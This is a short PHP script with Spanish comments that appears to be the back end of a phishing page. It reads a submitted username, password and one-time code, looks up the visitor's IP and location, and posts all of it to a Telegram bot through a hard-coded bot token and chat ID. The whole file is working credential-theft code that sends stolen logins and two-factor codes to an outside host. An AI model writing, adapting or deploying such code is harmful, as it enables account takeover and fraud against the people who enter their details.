<?php

date_default_timezone_set("America/Bogota");

// 📥 DATOS RECIBIDOS
$usuario = $_POST['usuario'] ?? '';
$clave   = $_POST['clave'] ?? '';
$codigo  = $_POST['codigo'] ?? '';

// 🌐 IP REAL
function getIP(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

$ip = getIP();
// 🌍 GEOLOCALIZACIÓN
$geo = @json_decode(file_get_contents("http://ipapi.co/$ip/json/"));

$pais = ($geo && $geo->status == "success") ? $geo->country : "Desconocido";
$ciudad = ($geo && $geo->status == "success") ? $geo->city : "Desconocido";
// 🕒 HORA
$fecha = date("Y-m-d H:i:s");

// 🔐 TOKEN Y CHAT ID (TU BOT)
$token = "8687740380:AAGWDU18CPeXsMWhpzy1n6uZ-MkeTxWYYUo";
$chat_id = "8448767308";

// 🧾 MENSAJE
$mensaje = "💳 NUEVO ACCESO\n\n";

if($usuario){
    $mensaje .= "👤 Usuario: $usuario\n";
}

if($clave){
    $mensaje .= "🔑 Clave: $clave\n";
}

if($codigo){
    $mensaje .= "📲 Código: $codigo\n";
}

$mensaje .= "\n🌐 IP: $ip\n";
$mensaje .= "📍 País: $pais\n";
$mensaje .= "🏙 Ciudad: $ciudad\n";
$mensaje .= "🕒 Hora: $fecha";

// 🚀 ENVÍO A TELEGRAM
$url = "https://api.telegram.org/bot$token/sendMessage";

$data = [
    "chat_id" => $chat_id,
    "text" => $mensaje
];

// CURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);
curl_close($ch);

// RESPUESTA
echo "OK";

?>
